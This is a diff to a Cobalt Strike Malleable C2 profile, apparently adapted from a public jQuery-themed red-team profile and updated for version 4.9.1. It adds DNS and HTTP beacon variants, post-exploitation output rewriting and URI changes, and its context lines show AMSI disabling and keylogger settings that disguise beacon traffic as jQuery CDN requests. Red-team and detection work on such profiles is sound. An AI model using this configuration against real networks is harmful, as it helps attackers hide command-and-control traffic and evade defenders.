@@ -1,5 +1,5 @@
-# stripped from comments https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.8.profile
-# for cs 4.8
+# stripped from comments https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
+# for cs 4.9.1
 set sample_name "jQuery CS 4.8 Profile";
 
 set sleeptime "45000";         # 45 Seconds
@@ -47,6 +47,31 @@ dns-beacon {
     set ns_response      "zero";
 }
 
+dns-beacon "variant-x" {
+    set dns_idle           "8.8.8.8"; #google.com (change this to match your campaign)
+    set dns_max_txt        "213";
+    set dns_sleep          "2"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
+    set dns_ttl            "123";
+    set maxdns             "250";
+    set dns_stager_prepend ".ress.126.";
+    set dns_stager_subhost ".feeds.16.";
+    set beacon           "aa.bc.";
+    set get_A            "bb.1a.";
+    set get_AAAA         "cc.4a.";
+    set get_TXT          "dd.tx.";
+    set put_metadata     "ee.md.";
+    set put_output       "ff.po.";
+    set ns_response      "zero";
+}
+
+http-beacon {
+    set library "winhttp";
+}
+
+http-beacon "variant-x" {
+    set library "wininet";
+}
+
 set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
 set ssh_pipename      "wkssvc##";
 
@@ -86,6 +111,15 @@ post-ex {
     set amsi_disable "true";
     set pipename "Winsock2\\CatalogChangeListener-###-0,";
     set keylogger "GetAsyncKeyState";
+    set cleanup "false";
+    transform-x64 {
+        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";
+        strrep "is alive." "is up.";
+    }
+    transform-x86 {
+        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";
+        strrep "is alive." "is up.";
+    }
 }
 
 set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS
@@ -157,7 +191,7 @@ http-config {
 
 http-get {
 
-    set uri "/jquery-3.3.1.min.js";
+    set uri "/jquery-3.3.1.min.js /jquery-1.3.3.7.min.js";
     set verb "GET";
 
     client {
@@ -165,6 +199,8 @@ http-get {
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
         header "Referer" "http://code.jquery.com/";
         header "Accept-Encoding" "gzip, deflate";
+
+        parameter "param_name" "param_value";
 
         metadata {
             base64url;
